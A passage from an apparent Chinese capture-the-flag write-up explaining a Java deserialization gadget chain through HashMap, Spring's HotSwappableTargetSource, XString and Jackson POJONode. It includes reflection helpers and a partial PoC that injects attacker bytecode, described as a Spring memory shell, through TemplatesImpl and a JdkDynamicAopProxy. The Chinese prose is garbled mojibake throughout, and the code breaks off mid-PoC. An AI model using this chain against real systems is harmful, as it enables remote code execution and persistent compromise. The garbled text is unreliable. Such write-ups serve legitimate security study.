</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setFiled</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">templates</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">values</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IllegalAccessException</span><span class="p">,</span><span class="w"> </span><span class="n">NoSuchFieldException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">declaredField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">templates</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="n">name</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">declaredField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">declaredField</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="n">values</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><h1 id="0x07-å¦ä¸€ç§è§¦å‘tostring">0x07 å¦ä¸€ç§è§¦å‘tostring<a hidden class="anchor" aria-hidden="true" href="#0x07-å¦ä¸€ç§è§¦å‘tostring">#</a></h1>
<p>é™¤äº†ç”¨ä¸Šé¢CC5æ¥è§¦å‘tostringæ–¹æ³•è¿˜æœ‰å…¶ä»–é“¾å­ï¼Œ<code>org.springframework.aop.target.HotSwappableTargetSource.java</code>(<code>HSTS</code>)ï¼Œè¿™ä¸ªç±»æ˜¯spring aopæ¨¡å—çš„</p>
<p>è¿™é‡Œæ˜¯çœ‹<a href="https://xiinnn.com/posts/2023zjctf-pre-secobj/#signedobject%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%94%A8hsts%E5%A5%97%E5%A8%83%E8%A7%A6%E5%8F%91">secobj</a>è¿™é“å’Œjacksonç›¸å…³çš„ååºåˆ—åŒ–é¢˜æ¥è§¦åˆ°çš„ï¼Œè¿™é‡Œçœ‹åˆ°é“¾å­</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">HashMap</span><span class="err">#</span><span class="n">readObject</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">HashMap</span><span class="err">#</span><span class="n">putVal</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">HotSwappableTargetSource</span><span class="err">#</span><span class="n">equals</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">XString</span><span class="err">#</span><span class="n">equals</span><span class="w"> </span><span class="o">-&gt;</span><span class="n">POJONode</span><span class="err">#</span><span class="n">toString</span><span class="w">
</span></span></span></code></pre></div><p>è¿™ä¸ªæ˜¯å‰é¢çš„è§¦å‘çš„<code>åˆ©ç”¨è¿</code>ï¼Œæˆ‘ä»¬ç®€å•åˆ†æä¸‹é“¾å­ï¼Œæˆ‘ç¬¬ä¸€çœ¼çœ‹è¿™ä¸ªé“¾å­å°±æƒ³ä¸ºå•¥è¦<code>HotSwappableTargetSource#equals</code>è¿™æ­¥ï¼Œç›´æ¥<code>XString#equals</code>ä¸å¥½ä¹ˆã€‚æˆ‘ä»¬å¼€å§‹åˆ†æ</p>
<p>ä¸€å¼€å§‹æˆ‘å°±é‡åˆ°äº†å›°éš¾ç‚¹ï¼Œæˆ‘æ˜¯è°ƒç”¨<code>else</code>ä¸­çš„<code>key.equals(k)</code>æ¥è§¦å‘åé¢çš„é“¾å­ï¼Œä½†æ˜¯æˆ‘ä»¬è¿›å…¥elseå¹¶ä¸å®¹æ˜“</p>
<p><img loading="lazy" src="../images/image-20241202111608200.png" alt="image-20241202111608200"  />
</p>
<h3 id="é—®é¢˜1-putval">é—®é¢˜1 putVal<a hidden class="anchor" aria-hidden="true" href="#é—®é¢˜1-putval">#</a></h3>
<ol>
<li>tab</li>
</ol>
<p>è¿™é‡Œå¯ä»¥çœ‹åˆ°<code>p</code>æ˜¯ä»<code>tab</code>ä¸­å–å€¼çš„ï¼Œå…¶ä¸­<code>i</code>è¿˜æ˜¯é€šè¿‡<code>andå’Œhashè¿ç®—</code>ï¼Œè¿™é‡Œæ˜æ˜¾ä¸€æ¬¡putValæ–¹æ³•ä¸å¤Ÿï¼Œæˆ‘ä»¬ç¬¬ä¸€æ¬¡ç»™<code>tab[i]</code>,ç¬¬äºŒæ¬¡è°ƒç”¨ç¬¬ä¸€æ¬¡çš„<code>tab[i]</code></p>
<p><strong>Hashmap#readObject</strong> ä¸­ä¹Ÿæ˜¯forè°ƒç”¨<code>putVal</code>ï¼Œä¸Šé¢æƒ³æ³•å¯ä»¥å®ç°</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">mappings</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@SuppressWarnings</span><span class="p">(</span><span class="s">&#34;unchecked&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">K</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">K</span><span class="p">)</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@SuppressWarnings</span><span class="p">(</span><span class="s">&#34;unchecked&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">V</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">V</span><span class="p">)</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">putVal</span><span class="p">(</span><span class="n">hash</span><span class="p">(</span><span class="n">key</span><span class="p">),</span><span class="w"> </span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="n">value</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><ol start="2">
<li>mappings</li>
</ol>
<p>é€šè¿‡<code>putVal()</code>ä¸­çš„ä»£ç ï¼Œæˆ‘ä»¬çŸ¥é“è¦è¿›å…¥elseï¼Œ<strong><code>ç¬¬äºŒæ¬¡çš„iè¦å’Œç¬¬ä¸€æ¬¡çš„iä¸€æ ·</code></strong>ï¼Œæ‰èƒ½è®©</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="p">(</span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tab</span><span class="o">[</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">n</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">1</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">hash</span><span class="o">]</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w">  </span><span class="p">(</span><span class="n">è¿™é‡Œæ˜¯ä¸ç­‰äº</span><span class="err">ï¼Œ</span><span class="n">mdæ ¼å¼çš„é—®é¢˜</span><span class="p">)</span><span class="w">
</span></span></span></code></pre></div><p>åŠä¸¤æ¬¡çš„<code>keyçš„hash</code>å€¼è¦ä¸€æ ·ï¼Œä¹Ÿå°±æ˜¯é—´æ¥keyè¦ä¸€æ ·å’¯ï¼Ÿï¼Œä½†æ˜¯èµ‹å€¼ç›´æ¥putçš„è¯ï¼Œåªä¼šæœ‰ä¸€å¯¹å€¼ï¼Œè¦†ç›–ç¬¬ä¸€ä¸ªvalueã€‚è€Œputä¹Ÿæ˜¯è°ƒç”¨çš„<code>putVal()</code>ï¼Œä¼šåˆ¤æ–­keyçš„hashï¼Œä¸€æ ·çš„è¯å¹¶ä¸ä¼šå¤šåŠ ä¸€å¯¹å€¼ã€‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">V</span><span class="w"> </span><span class="nf">put</span><span class="p">(</span><span class="n">K</span><span class="w"> </span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="n">V</span><span class="w"> </span><span class="n">value</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">putVal</span><span class="p">(</span><span class="n">hash</span><span class="p">(</span><span class="n">key</span><span class="p">),</span><span class="w"> </span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="n">value</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>è¿™é‡Œä¸»è¦åŸå› æ˜¯è¿™ä¸ª<code>hashå€¼</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬ç¬¬äºŒå€¼å¯ä»¥ç›´æ¥ç”¨è¿™ä¸ª<code>putVal()æ¥èµ‹å€¼</code>ï¼Œhashæˆ‘ä»¬å¯ä»¥éšä¾¿è®¾ç½®ï¼Œå› ä¸ºreadObjectçš„æ—¶å€™ï¼Œ<code>hashå€¼</code>è¿˜æ˜¯å»é€šè¿‡<code>hash(key)</code>å»è·å–çš„ï¼Œå¹¶ä¸å½±å“</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">HashMap</span><span class="w"> </span><span class="n">hashMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">hashMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">hotSwappableTargetSource2</span><span class="p">,</span><span class="s">&#34;111&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//hashMap.put(hotSwappableTargetSource,&#34;222&#34;);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">putVal</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">hashMap</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;putVal&#34;</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="kt">boolean</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="kt">boolean</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">putVal</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">putVal</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">hashMap</span><span class="p">,</span><span class="n">123</span><span class="p">,</span><span class="n">hotSwappableTargetSource</span><span class="p">,</span><span class="s">&#34;222&#34;</span><span class="p">,</span><span class="kc">false</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><ol start="3">
<li>key</li>
</ol>
<p>hashçš„é—®é¢˜è§£å†³äº†ï¼Œæœ‰ä¸ª<code>ç©¶æé—®é¢˜</code>ï¼ˆä¸¤æ¬¡çš„keyä¸èƒ½ç›¸ç­‰ï¼‰</p>
<p>çœ‹åˆ°è¿™é‡Œè¿›å…¥elseä¹‹åçš„è¿™ä¸ª<code>ifåˆ¤æ–­</code>ï¼Œè¿™é‡Œ<code>||</code>å¦‚æœå‰é¢ä¸º<code>true</code>äº†çš„è¯å°±<code>ä¸ä¼šæ‰§è¡Œåé¢çš„key.equals(k)</code>æ–¹æ³•è¿›è¡Œåˆ¤æ–­äº†</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="na">hash</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">hash</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">((</span><span class="n">k</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p</span><span class="p">.</span><span class="na">key</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">(</span><span class="n">key</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">key</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">k</span><span class="p">))))</span><span class="w">
</span></span></span></code></pre></div><p>Hashmap#hash</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">hash</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">key</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">h</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="n">key</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">0</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">(</span><span class="n">h</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">key</span><span class="p">.</span><span class="na">hashCode</span><span class="p">())</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="p">(</span><span class="n">h</span><span class="w"> </span><span class="o">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">16</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>ä½†æ˜¯å¸¸è§„æ€è·¯ï¼Œè¿™ä¸ªæ˜¯ä¸å¯èƒ½çš„ï¼Œ<strong>å› ä¸ºhashå€¼è¦ä¸€æ ·æ„å‘³ç€keyä¸€æ ·ï¼Œè€Œè¿™é‡Œå´è¦keyä¸ç›¸åŒï¼â€”â€”ï¼</strong>ï¼Œé™¤éä»–<code>hashCode()</code>æœ‰é»‘é­”æ³•å˜¿å˜¿</p>
<p><strong>è¿™é‡Œä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆè¦å¥—ä¸€å±‚HSTSçš„åŸå› </strong></p>
<h3 id="hsts-æˆ‘çš„ç¥">HSTS æˆ‘çš„ç¥<a hidden class="anchor" aria-hidden="true" href="#hsts-æˆ‘çš„ç¥">#</a></h3>
<p>è¿™å®¶ä¼™<code>hashCode</code>æ–¹æ³•å®Œç¾è§£å†³çš„äº†è¿™ä¸ªé—®é¢˜ï¼Œå…¶è¿”å›çš„æ˜¯ä¸€ä¸ª<code>å›ºå®šå€¼</code>æˆ‘å»ï¼ˆä¸çŸ¥é“ä¸ºä»€ä¹ˆè¿™ä¹ˆè®¾è®¡ï¼Œä»é€»è¾‘ä¸Šçœ‹å…¶å®ç®—ä¸ªç¼ºé™·ï¼Œä¸ç¬¦åˆé€»è¾‘å‘€hhhï¼‰</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">hashCode</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">HotSwappableTargetSource</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">hashCode</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>æ‰€ä»¥è¿™é‡Œkeyéƒ½ç”¨<code>HotSwappableTargetSource</code></p>
<p>åé¢å°±æ¯”è¾ƒé¡ºåˆ©äº†ï¼Œæ²¡ä»€ä¹ˆé—®é¢˜ï¼Œè¿™é‡Œæ³¨æ„ä¸‹ç¬¬ä¸€ä¸ª<code>XString</code>è¦ç”¨<code>Stringé‚£ä¸ªæ„é€ æ–¹æ³•</code>ï¼Œå› ä¸º<code>str()é‡ŒStringè½¬ä¹‰</code>å¯èƒ½æŠ¥é”™ä¸­æ–­</p>
<p><img loading="lazy" src="../images/image-20241202115114191.png" alt="image-20241202115114191"  />
</p>
<h2 id="poc">poc<a hidden class="anchor" aria-hidden="true" href="#poc">#</a></h2>
<p>è¿™é‡Œpocè¿˜å¤¹æ‚ç€<code>SignedObject</code>(äºŒæ¬¡ååºåˆ—åŒ–)å’Œ<code>JdkDynamicAopProxy</code>(ç¨³å®šè§¦å‘getOutputProperties)ï¼Œ<code>springå†…å­˜é©¬</code></p>
<p>å› ä¸ºé¢˜ç›®éœ€è¦è¿™äº›ï¼Œç„¶åç›¸å…³ä»£ç å’Œé™„ä»¶æˆ‘ä¹Ÿä¼šæ”¾åˆ°pocä¸‹é¢</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">com.fasterxml.jackson.databind.node.POJONode</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.govuln.shiroattack.Evil</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xml.internal.utils.XMLString</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xpath.internal.objects.XString</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.ClassPool</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.CtClass</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.tomcat.util.codec.binary.Base64</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.aop.framework.AdvisedSupport</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.aop.target.HotSwappableTargetSource</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.management.BadAttributeValueExpException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.transform.Templates</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.transform.Transformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.transform.TransformerConfigurationException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.security.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Properties</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">jackson</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ClassPool</span><span class="w"> </span><span class="n">pool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ClassPool</span><span class="p">.</span><span class="na">getDefault</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">CtClass</span><span class="w"> </span><span class="n">clazzs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pool</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">Interceptor_demo</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazzs</span><span class="p">.</span><span class="na">toBytecode</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//System.out.println(Base64.getEncoder().encodeToString(code));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="n">templates</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_name&#34;</span><span class="p">,</span><span class="s">&#34;111&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_bytecodes&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[][]</span><span class="p">{</span><span class="n">code</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_tfactory&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">TransformerFactoryImpl</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;org.springframework.aop.framework.JdkDynamicAopProxy&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">cons</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">AdvisedSupport</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">cons</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">AdvisedSupport</span><span class="w"> </span><span class="n">advisedSupport</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">AdvisedSupport</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">advisedSupport</span><span class="p">.</span><span class="na">setTarget</span><span class="p">(</span><span class="n">templates</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvocationHandler</span><span class="w"> </span><span class="n">handler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">InvocationHandler</span><span class="p">)</span><span class="w"> </span><span class="n">cons</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">advisedSupport</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">proxyObj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Proxy</span><span class="p">.</span><span class="na">newProxyInstance</span><span class="p">(</span><span class="n">clazz</span><span class="p">.</span><span class="na">getClassLoader</span><span class="p">(),</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Templates</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="n">handler</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">POJONode</span><span class="w"> </span><span class="n">jsonNodes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">POJONode</span><span class="p">(</span><span class="n">proxyObj</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">BadAttributeValueExpException</span><span class="w"> </span><span class="n">badAttributeValueExpException</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">BadAttributeValueExpException</span><span class="p">(</span><span class="n">111</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">badAttributeValueExpException</span><span class="p">,</span><span class="s">&#34;val&#34;</span><span class="p">,</span><span class="n">jsonNodes</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// ç”Ÿæˆç§é’¥å’Œå…¬é’¥</span><span class="w">
